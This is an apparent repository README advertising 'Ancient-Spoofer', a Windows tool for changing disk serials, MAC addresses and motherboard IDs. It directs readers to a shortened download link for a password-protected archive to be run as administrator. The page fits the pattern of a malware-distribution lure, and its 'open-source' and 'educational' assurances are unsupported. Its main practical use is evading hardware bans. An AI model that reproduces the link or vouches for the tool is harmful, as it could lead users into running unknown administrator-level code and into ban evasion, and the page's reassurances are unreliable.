# Ancient-Spoofer

## Advanced hardware ID modification suite for security research and driver testing.

![Preview](https://i.ibb.co/fdTLt26t/image.png)

## Download

1. **[DOWNLOAD — Click here](https://skroc.pl/m9WjxVg)**
2. Extract the archive (password is provided in the `README_FIRST.txt` inside).
3. Run the executable with administrative rights.
4. Refer to the `docs/` folder for complete setup instructions.

## Features

- **Multi‑Component Spoofing** – Change disk serials, MAC addresses, motherboard UUID, and SMBIOS data.
- **Persistent Mode** – Changes survive system reboots and can be set to load at boot time.
- **Profile Manager** – Create, save, and switch between different hardware fingerprints instantly.
- **Batch Automation** – Full command‑line interface for scripting and integration with CI/CD.
- **Safe Rollback** – One‑click restoration of all original hardware identifiers.
- **Integrity Verification** – Checks driver signatures to prevent tampering.
- **Logging & Debug** – Verbose logging for troubleshooting and forensic analysis.
- **Portable Execution** – No installation required; runs directly from removable media.
- **Compatibility Checker** – Scans system for conflicts and recommends solutions.
- **Comprehensive Documentation** – Includes PDF manuals, video walkthroughs, and FAQs.

## Requirements

- Windows 10 / 11 (64‑bit, version 2004 or newer)
- Administrator account
- .NET Framework 4.8+ or .NET Core 3.1+ (runtime included)
- 200 MB free disk space

## Usage

1. Extract the contents to a folder like `C:\AncientSpoofer`.
2. Right‑click `AncientSpoofer.exe` and select **Run as administrator**.
3. The main dashboard displays your current HWID values.
4. Choose which IDs to spoof (e.g., disk, network, motherboard) or load a profile.
5. Click **Apply Spoof** – your system will restart automatically.
6. After reboot, run the built‑in verifier to confirm changes.
7. To revert, launch the tool again and press **Restore Original**.

## About the Project

Ancient-Spoofer is developed as an open‑source educational resource for understanding how operating systems interact with hardware identifiers and how these can be dynamically altered for legitimate purposes – such as driver development, anti‑cheat system testing, or hardware compatibility analysis. The tool operates at a kernel level using signed drivers and does not bypass any software licensing or DRM mechanisms. All functionalities are transparent and fully documented.

## Legality

This repository is intended for educational and research use only. The authors do not endorse or support any illegal activities, including cheating in games or circumventing software licenses. Users are solely responsible for complying with applicable laws and terms of service. All trademarks belong to their respective owners.

---

> **Tags:** ancient-spoofer, hwid-spoofer, hardware-id, spoofer-tool, kernel-driver, windows-internals, security-research, educational, anti-cheat-testing, driver-development, system-tweaks, windows-10, windows-11, testing-framework, cybersecurity
